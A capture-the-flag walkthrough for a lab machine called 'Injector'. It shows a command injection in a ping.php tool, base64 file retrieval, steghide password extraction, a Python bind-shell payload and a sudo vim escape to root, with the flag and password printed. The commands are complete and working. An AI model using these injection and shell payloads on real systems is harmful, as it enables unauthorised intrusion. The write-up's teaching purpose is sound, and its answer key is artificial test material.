Injector
Field	Value
Category	Machines
Level	Easy
Points	50
Lesson	Privilege Escalation

Idea in one line
A ping.php web tool puts our input straight into a shell command → command injection → we download a hidden image → steghide reveals alex's password → we open a shell with a terminal → su alex → sudo vim escape → root.

Step 1 — Scan and find the tool
nmap -Pn -T4 -sV -p- --min-rate 3000 $T
# 22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu
# 80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
The main page is just the default Apache page. Look for hidden folders:

gobuster dir -u http://$T/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
# /secret/           (301)
Inside /secret/tools/ there is a file listing with ping.php — a web tool that pings hosts.

Step 2 — Command injection
ping.php takes a domain parameter and puts it directly into a shell command. So if we add ; followed by a command, it runs:

curl -s -G --data-urlencode "domain=127.0.0.1;id" "http://$T/secret/tools/ping.php"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
We can run any command as www-data. For every command below, send it the same way — just change what comes after the ;.

Step 3 — Look around
curl -s -G --data-urlencode "domain=;grep sh$ /etc/passwd" "http://$T/secret/tools/ping.php"
# alex:x:1001:1001::/home/alex:/bin/sh        <- the user we want

curl -s -G --data-urlencode "domain=;ls -la /var/www" "http://$T/secret/tools/ping.php"
# -rw-rw-r-- 1 ubuntu ubuntu 322279 Aug 30  2020 TrollFace.jpg
A strange picture TrollFace.jpg sits in the web folder — smells like steganography.

Step 4 — Download the image through the browser
We cannot connect back to ourselves (we are behind NAT), but we can turn the injection into a normal URL and use the browser to fetch the file:

Open Firefox.

In the address bar, type this URL (replace $T with your target IP):

http://$T/secret/tools/ping.php?domain=;base64 -w0 /var/www/TrollFace.jpg
The page shows a very long base64 text — that is the picture, encoded. Careful: the page prints the result twice. Select and copy only the first block (Ctrl+C).

Open a text editor (gedit or mousepad), paste the text (Ctrl+V), and save it as /tmp/tf.b64.

Now turn it back into a picture with one terminal command:

cd /tmp/
base64 -d tf.b64 > TrollFace.jpg
file TrollFace.jpg
# JPEG image data, 3840x2160
Step 5 — Steghide → password
steghide extract -sf TrollFace.jpg -p "" -xf password.txt
cat password.txt
# Congratulations !! Here is your Password : D0n41dTrump
The passphrase is empty — just press Enter. We get alex's password: D0n41dTrump.

Step 6 — Open a shell with a terminal (bind shell)
SSH here accepts keys only, so the password is useless from outside. It only works on the box itself with su — and su needs a real terminal.

So we start a small Python shell on the target that listens on port 4444 (a bind shell — it works because the target is public and we connect to it; a reverse shell would need the target to call us back through NAT, which is blocked):

cat > /tmp/payload.txt <<'EOF'
127.0.0.1; nohup timeout 240 python3 -c "import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',4444));s.listen(1);c,_=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn('/bin/bash')" >/dev/null 2>&1 &
EOF

curl -s --get --data-urlencode "domain=$(cat /tmp/payload.txt)" \
  "http://$T/secret/tools/ping.php" -o /dev/null
sleep 3
Piece	Why
bind + listen + accept	the target waits, we connect to it — no NAT problem
os.dup2(c.fileno(),0/1/2)	makes the socket act like keyboard + screen
pty.spawn('/bin/bash')	gives a real terminal — su refuses to work without one
nohup … &	lets the web request finish instead of hanging
timeout 240	shell closes itself after 4 minutes (clean)
Now connect:

nc $T 4444
Step 7 — su alex → sudo vim → root
su alex           # password: D0n41dTrump
sudo -l
# (ALL) NOPASSWD: /usr/bin/vim
Alex can run vim as root without a password — and vim can open a shell (GTFOBins trick):

sudo vim -c ':!/bin/sh' -c ':q'
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
Flag
2afe5ca13f6aa7c615c05d9cceb6c23e
Attack chain
gobuster -> /secret/tools/ping.php
        -> command injection (;command)     [www-data]
        -> download TrollFace.jpg as base64 through the browser
        -> steghide (empty passphrase) -> alex password
        -> python bind shell on :4444       (terminal for su)
        -> su alex -> sudo vim -> root
        -> cat /root/root.txt
What we learned
Never build shell commands from user input. One ; turned a ping tool into full RCE.
Command injection can also move files. We turned the RCE into a URL and saved the image through the browser as base64 text.
A password is still useful when SSH is keys-only — su uses the same password locally, it just needs a terminal: bind shell on a public target, reverse shell over a VPN on a private one.
sudo vim = root. Any editor that can spawn a shell (vim, less, find...) with sudo rights is game over — check sudo -l first and look the binary up on GTFOBins.
